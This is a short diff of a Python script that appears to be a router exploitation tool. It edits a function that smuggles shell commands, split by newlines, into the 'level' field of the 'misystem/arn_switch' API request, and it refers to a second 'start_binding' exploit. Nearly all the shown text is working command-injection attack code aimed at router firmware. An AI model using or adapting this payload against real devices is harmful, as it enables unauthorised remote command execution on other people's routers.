@@ -23,7 +23,7 @@ except NameError:
 def exploit_1(cmd, api = 'API/misystem/arn_switch'):
     # vuln/exploit author: ?????????
     cmd = cmd.replace(';', '\n')
-    params = { 'open': 1, 'mode': 1, 'level': "\n" + cmd + "\n" }
+    params = { 'open': 0, 'mode': 1, 'level': "\n" + cmd + "\n" }
     res = gw.api_request(api, params, resp = 'text')
     time.sleep(0.5)
     return res
@@ -60,7 +60,7 @@ for idx, exp_func in enumerate(exp_list):
 gw.set_diag_iperf_test_thr(20)
 
 if not exec_cmd:
-    raise ExploitNotWorked('Exploits arn_switch/start_binding not working!!!')
+    raise ExploitNotWorked('Exploits "arn_switch/start_binding" not working!!!')
 
 if exec_cmd == exploit_1:
     print('Exploit "arn_switch" detected!') 
